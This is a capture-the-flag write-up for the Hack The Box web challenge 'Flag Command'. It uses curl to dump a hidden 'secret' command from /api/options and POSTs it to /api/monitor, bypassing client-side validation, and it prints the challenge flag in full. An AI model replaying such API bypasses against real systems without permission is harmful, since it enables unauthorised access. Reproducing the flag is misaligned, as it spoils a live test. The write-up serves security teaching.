# HTB — "Flag Command" (Web)

**Category:** Web  
**Difficulty:** Easy

---

## Challenge Description

> Embark on the "Dimensional Escape Quest" where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!

The challenge spawns a Docker instance exposed as an `IP:PORT` pair:

```text
154.57.164.83:43910
```

> The IP and port change every time the instance is respawned.

---

## Tooling

- `curl` — to send requests and read raw responses
- A text editor — to read through the client-side JavaScript

---

## Recon: A Text-Adventure Terminal

A first request shows a Flask application (Werkzeug) styled as a retro terminal:

```bash
curl -i http://154.57.164.83:43910/
```

```text
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.11.8
```

The page is a fake "OS terminal" (`<title>Flag Command</title>`) that accepts typed commands (`start`, `help`, `clear`, `restart`, `info`) to play a small choose-your-own-adventure game: *"YOU WAKE UP IN A FOREST."*, then pick directions (`HEAD NORTH`, etc.) through several steps. It loads three scripts:

```text
/static/terminal/js/commands.js
/static/terminal/js/main.js
/static/terminal/js/game.js
```

---

## Reading the Client-Side Code

**`commands.js`** defines the static game text (intro story, help menu, win/lose messages) and the first set of options presented to the player:

```javascript
export const INITIAL_OPTIONS = [
    '<span class="command">You have 4 options!</span>',
    'HEAD NORTH',
    'HEAD SOUTH',
    'HEAD EAST',
    'HEAD WEST'
];
```

**`main.js`** shows how a chosen option is actually validated and sent to the server:

```javascript
async function CheckMessage() {
    fetchingResponse = true;
    currentCommand = commandHistory[commandHistory.length - 1];

    if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
        await fetch('/api/monitor', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 'command': currentCommand })
        })
            .then((res) => res.json())
            .then(async (data) => {
                await displayLineInTerminal({ text: data.message });

                if (data.message.includes('Game over')) { playerLost(); return; }
                if (data.message.includes('HTB{')) { playerWon(); return; }
                ...
            });
    }
}
```

Two things stand out immediately:

1. The check `availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)` is **entirely client-side**. It only decides whether the browser *bothers* to call `fetch()` — nothing stops a raw `curl` request straight to `/api/monitor` with any `command` value, bypassing the game-step logic completely.
2. There is a `'secret'` list inside `availableOptions`, separate from the normal maze steps (`1`–`4`). The client code already treats it as a valid, always-accepted branch.

The actual contents of `availableOptions` are fetched at page load from another endpoint, visible at the bottom of `main.js`:

```javascript
const fetchOptions = () => {
    fetch('/api/options')
        .then((data) => data.json())
        .then((res) => { availableOptions = res.allPossibleCommands; });
};
```

**`game.js`** simply wires `playerWon()` / `playerLost()` to the `GAME_WON` / `GAME_LOST` messages from `commands.js` — nothing security-relevant here, it only confirms that the win condition is driven entirely by the server's `message` field containing `HTB{`.

---

## Finding the Secret Command

Querying that endpoint directly dumps every valid command, including the hidden `secret` one:

```bash
curl -s http://154.57.164.83:43910/api/options
```

```json
{
  "allPossibleCommands": {
    "1": ["HEAD NORTH", "HEAD WEST", "HEAD EAST", "HEAD SOUTH"],
    "2": ["GO DEEPER INTO THE FOREST", "FOLLOW A MYSTERIOUS PATH", "CLIMB A TREE", "TURN BACK"],
    "3": ["EXPLORE A CAVE", "CROSS A RICKETY BRIDGE", "FOLLOW A GLOWING BUTTERFLY", "SET UP CAMP"],
    "4": ["ENTER A MAGICAL PORTAL", "SWIM ACROSS A MYSTERIOUS LAKE", "FOLLOW A SINGING SQUIRREL", "BUILD A RAFT AND SAIL DOWNSTREAM"],
    "secret": ["Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"]
  }
}
```

The `secret` entry is a single, oddly specific phrase that is accepted at **any** game step, by design of the `||` check in `CheckMessage()`. This is the application's intended "developer backdoor" / easter-egg command rather than a bug to chain through multiple requests — it is meant to be discoverable by reading the client code and querying `/api/options`, and it short-circuits the whole maze.

---

## Triggering the Flag

Sending that exact phrase as the `command` value straight to `/api/monitor`, bypassing the UI entirely:

```bash
curl -s -X POST http://154.57.164.83:43910/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

---

## The Flag

```json
{
  "message": "HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}"
}
```

```text
HTB{REDACTED}
```

---

## Takeaways

- **Client-side validation is not security.** Here, the only thing deciding which `command` values are "allowed" was a JavaScript `if` statement in the browser — trivially bypassed by talking to the API endpoint directly with `curl`.
- **Any endpoint that returns the full ruleset of what a client is allowed to send (`/api/options` returning every valid command, including a `secret` one) is effectively handing the attacker a roadmap.** Server-side logic should never assume the client only ever sends what the UI exposes.
- **"Hidden" or "developer" commands/easter eggs embedded in a public JS bundle are not actually hidden** — anything shipped to the browser is fully readable. If a backdoor-style command must exist for debugging, it shouldn't ship in client code reachable by any visitor.
- **The flag name itself (`D3v3l0p3r_t00l5_4r3_b35t`) reinforces the lesson:** browser DevTools (Network tab, Sources tab) are often all that's needed to read the client logic, enumerate hidden API responses, and replay requests outside the intended UI flow.
- As with most "game"-styled web challenges, **the real attack surface isn't the game logic itself but the API behind it** — always inspect what the front-end actually calls, and test those calls independently of the UI.
